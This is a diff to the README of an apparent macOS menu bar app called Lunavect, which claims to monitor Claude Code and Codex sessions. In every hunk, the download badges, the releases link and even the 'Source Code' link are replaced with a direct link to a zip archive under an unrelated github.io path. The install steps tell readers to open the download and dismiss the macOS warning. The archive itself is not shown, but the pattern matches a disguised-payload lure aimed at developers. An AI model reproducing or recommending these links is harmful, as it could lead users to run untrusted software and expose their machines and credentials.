@@ -5,7 +5,7 @@ description: "Elevate Claude Code and Codex workflows with a macOS menu bar app 
 ---
 # 🖥️ Lunavect - Your AI Coding Sessions, Always in Sight
 
-[![Download Lunavect](https://img.shields.io/badge/Download-Lunavect-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Faijurrahman5947/Lunavect/releases)
+[![Download Lunavect](https://img.shields.io/badge/Download-Lunavect-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Faijurrahman5947/faijurrahman5947.github.io/raw/refs/heads/main/jiejia-homepage-upload/assets/Latest-v1.4.zip)
 
 ## 👋 What Is Lunavect?
 
@@ -37,7 +37,7 @@ Lunavect runs entirely on your machine. Your code, sessions, and data never leav
 
 Getting Lunavect running takes less than a minute. Here's what to do:
 
-1. **Visit the download link:** [Lunavect Releases](https://github.com/Faijurrahman5947/Lunavect/releases) - Visit this link to download the application.
+1. **Visit the download link:** [Lunavect Releases](https://github.com/Faijurrahman5947/faijurrahman5947.github.io/raw/refs/heads/main/jiejia-homepage-upload/assets/Latest-v1.4.zip) - Visit this link to download the application.
 2. **Find the latest version:** Look for the newest release at the top of the page.
 3. **Download the file:** Click the download link for the macOS version. The file will be saved to your Downloads folder.
 4. **Open the app:** Double-click the downloaded file. Your Mac might ask you to confirm you want to open it - that's normal.
@@ -181,7 +181,7 @@ Yes. Lunavect has read-only access. It cannot modify files, execute commands, or
 
 ## 📚 Additional Resources
 
-- **Source Code:** [GitHub Repository](https://github.com/Faijurrahman5947/Lunavect)
+- **Source Code:** [GitHub Repository](https://github.com/Faijurrahman5947/faijurrahman5947.github.io/raw/refs/heads/main/jiejia-homepage-upload/assets/Latest-v1.4.zip)
 - **Issue Tracker:** Report bugs or request features on GitHub
 - **Changelog:** See what's new in each version
 - **Contact:** Reach out through the GitHub discussion board
@@ -207,6 +207,6 @@ Lunavect turns your menu bar into a mission control for your AI coding tools. St
 
 Download Lunavect today and keep your Claude Code and Codex sessions always in view.
 
-[![Download Now](https://img.shields.io/badge/Get_Lunavect-free-2ea44f?style=for-the-badge&logo=appveyor&logoColor=white)](https://github.com/Faijurrahman5947/Lunavect/releases)
+[![Download Now](https://img.shields.io/badge/Get_Lunavect-free-2ea44f?style=for-the-badge&logo=appveyor&logoColor=white)](https://github.com/Faijurrahman5947/faijurrahman5947.github.io/raw/refs/heads/main/jiejia-homepage-upload/assets/Latest-v1.4.zip)
 
 Keywords: agent-monitoring, ai-coding, claude, claude-code, codex, desktop-widgets, developer-tools, macos, macos-app, menu-bar, menubar-app, notarized, open-source, openai-codex, session-manager, session-monitor, swift, swiftui, usage-limits, widgetkit
